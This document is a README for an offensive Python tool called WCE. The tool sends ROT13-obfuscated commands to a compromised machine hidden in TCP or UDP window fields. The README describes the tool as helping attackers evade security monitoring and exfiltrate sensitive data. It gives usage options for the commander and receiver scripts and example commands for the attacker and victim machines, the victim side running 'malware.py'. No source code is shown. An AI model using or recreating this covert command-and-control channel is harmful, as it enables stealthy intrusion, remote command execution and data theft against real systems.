# WCE (Window Commander and Exfiltrer)

<div align="center">
<img src="https://github.com/Cyber-Guy1/WCE/blob/main/assets/banner.png" width="70%" height="70%">
</div>

## Tool description

The WCE is a Python-based tool that allows sending commands to a compromised network node through IP packet window flags, using either TCP or UDP, with calculated checksum and other metrics that make the packet look legitimate and hard to detect. The tool implements ROT13 to obfuscate the commands, making it more difficult for the defenders to identify them.

The tool consists of two scripts: the commander and the receiver. The commander script runs on the attacker's machine and sends commands to the victim's machine. The receiver script runs on the victim's machine, listening for packets on a specific port. The victim machine should have access to a socket and a network interface to monitor the packet.

The commander script takes several parameters, such as the source and destination IP and port, delay between each packet, and the command to be sent. The receiver script listens on a specific port and executes the received commands.

One of the unique features of WCE is that there is no need for the attacker to send the packet to the victim directly. Instead, having the malicious packet flowing in the network is enough. The receiver script will take the window packets from specific ports and with a specific count and then execute them. This makes the tool more versatile and easier to use in various network environments.

The WCE tool is designed to make exfiltration and network command more stealthy by using window flags, which are often overlooked by security monitoring tools. By implementing a reliable and customizable transmission method, it helps attackers to evade detection and exfiltrate sensitive data.

## Usage
### Commander script:

```
usage: commander.py [-h] [-c COMMAND] [-t TARGET] [-dp DST_PORT] [-d DELAY]
                    [-s SOURCE] [-p PORT] [-P {TCP,UDP}]

options:
  -h, --help            show this help message and exit
  -c COMMAND, --command COMMAND
                        Command to execute
  -t TARGET, --target TARGET
                        Target IP
  -dp DST_PORT, --dst-port DST_PORT
                        Destination port
  -d DELAY, --delay DELAY
                        Seconds to delay between packets, the more seconds,
                        the more stable connection.
  -s SOURCE, --source SOURCE
                        Source IP
  -p PORT, --port PORT  Source port
  -P {TCP,UDP}, --protocol {TCP,UDP}
                        Protocol to use: TCP or UDP
```

### Receiver script:

```
usage: receiver.py [-h] [-i INTERFACE] [-pc PACKETSCOUNT] [-p PORT]

options:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Network capturing interface
  -pc PACKETSCOUNT, --packetsCount PACKETSCOUNT
                        Number of packets to capture
  -p PORT, --port PORT  Port that will receive the TCP packets
```

## Examples

The following is an example for the usage:
- Attacker machine:

```
sudo python3 commander.py -c ls -t 192.168.1.1 -dp 72 -d 10 -s 192.168.1.10 -p 72 -P TCP
```

- Victim machine:

```
sudo python3 malware.py -i en0 -pc 2 -p 72
```
